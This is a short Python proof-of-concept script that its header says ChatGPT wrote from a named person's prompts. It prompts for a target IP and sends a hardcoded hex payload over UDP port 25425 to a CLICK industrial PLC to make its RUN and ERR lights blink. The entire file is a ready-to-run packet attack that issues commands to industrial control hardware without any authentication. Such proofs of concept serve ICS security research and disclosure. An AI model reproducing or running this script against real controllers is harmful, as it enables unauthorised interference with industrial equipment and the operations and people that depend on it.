#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#    Written by ChatGPT with prompts by Mike Holcomb (mike@mikeholcomb.com).
#
#    This POC sends a specific payload to a CLICK PLC to make the RUN and ERR lights blink.



import socket

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def main():
    while True:
        ip = input("Enter the target IP address: ")
        if is_valid_ip(ip):
            break
        else:
            print("Invalid IP address. Please try again.")

    payload_hex = '4b4f500001006a570e0045016643c0a864c800d07c1a5687'
    payload = bytes.fromhex(payload_hex)

    # Define the UDP destination port
    dest_port = 25425

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        # Send the payload
        sock.sendto(payload, (ip, dest_port))
        print(f"Payload sent to {ip}:{dest_port}")
    except Exception as e:
        print(f"Failed to send payload: {e}")
    finally:
        # Close the socket
        sock.close()

if __name__ == "__main__":
    main()
